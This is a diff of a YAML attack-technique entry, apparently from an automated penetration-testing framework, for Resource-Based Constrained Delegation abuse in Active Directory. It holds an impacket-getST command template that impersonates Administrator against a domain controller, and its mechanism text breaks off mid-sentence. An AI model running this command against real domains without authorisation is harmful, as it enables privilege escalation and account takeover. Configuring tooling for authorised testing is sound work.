@@ -6,8 +6,8 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-getST '{domain}/{service_account}:{password}' -spn '{target_spn}'
-  -impersonate Administrator -dc-ip {target_ip}
+command_template: impacket-getST '{domain}/{service_account}:{password}' -spn '{target_spn}' -impersonate Administrator -dc-ip
+  {target_ip}
 parser: impacket_parser
 expected_effects:
 - delegation_abused
@@ -16,8 +16,22 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: This is similar to the basic [Constrained Delegation](constrained-delegation.md)
-  but **instead** of giving permissions to an **object** to **impersonate any user
-  against a machine**. Resource-based Constrain Delegation **sets** in **the object
+mechanism: This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions
+  to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object
   who is
 hacktricks_ref: windows-hardening/active-directory-methodology/README.md
+references:
+  ocd_mindmap_node_ids:
+  - 00d95fb22f
+  - 1b081a8c68
+  - 42e858082c
+  - 47b34a2482
+  - 6bfddb9cc2
+  - 76711d19f2
+  - a75b5b213b
+  - a916261ac8
+  - cb0f21dbcf
+  - ce31a781ac
+  - d9d71da7af
+  - dad86d3bfa
+  - f5fe84e854
